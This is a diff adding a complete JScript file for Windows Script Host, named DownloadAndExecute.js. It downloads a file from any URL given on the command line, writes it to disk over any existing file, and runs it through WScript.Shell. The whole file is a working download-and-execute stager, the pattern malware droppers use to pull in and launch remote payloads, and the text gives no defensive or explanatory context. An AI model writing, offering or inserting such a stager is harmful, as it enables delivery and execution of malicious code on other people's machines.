@@ -1,0 +1,37 @@
+var args = WScript.Arguments;
+
+if (args.length < 2) {
+    WScript.Echo("Usage: cscript.exe DownloadAndExecute.js <URL> <FilePath>");
+    WScript.Quit(1);
+}
+
+var strURL = args(0);
+var strFilePath = args(1);
+
+var objXMLHTTP = new ActiveXObject("MSXML2.XMLHTTP");
+var objADOStream = new ActiveXObject("ADODB.Stream");
+var objFSO = new ActiveXObject("Scripting.FileSystemObject");
+
+objXMLHTTP.open("GET", strURL, false);
+objXMLHTTP.send();
+
+if (objXMLHTTP.status == 200) {
+    objADOStream.Open();
+    objADOStream.Type = 1; // adTypeBinary
+
+    objADOStream.Write(objXMLHTTP.responseBody);
+    objADOStream.Position = 0;
+
+    if (objFSO.FileExists(strFilePath)) {
+        objFSO.DeleteFile(strFilePath);
+    }
+    objADOStream.SaveToFile(strFilePath);
+    objADOStream.Close();
+
+    var objShell = new ActiveXObject("WScript.Shell");
+    objShell.Run(strFilePath, 1, false);
+
+    WScript.Echo("File downloaded and executed successfully.");
+} else {
+    WScript.Echo("Failed to download file.");
+}
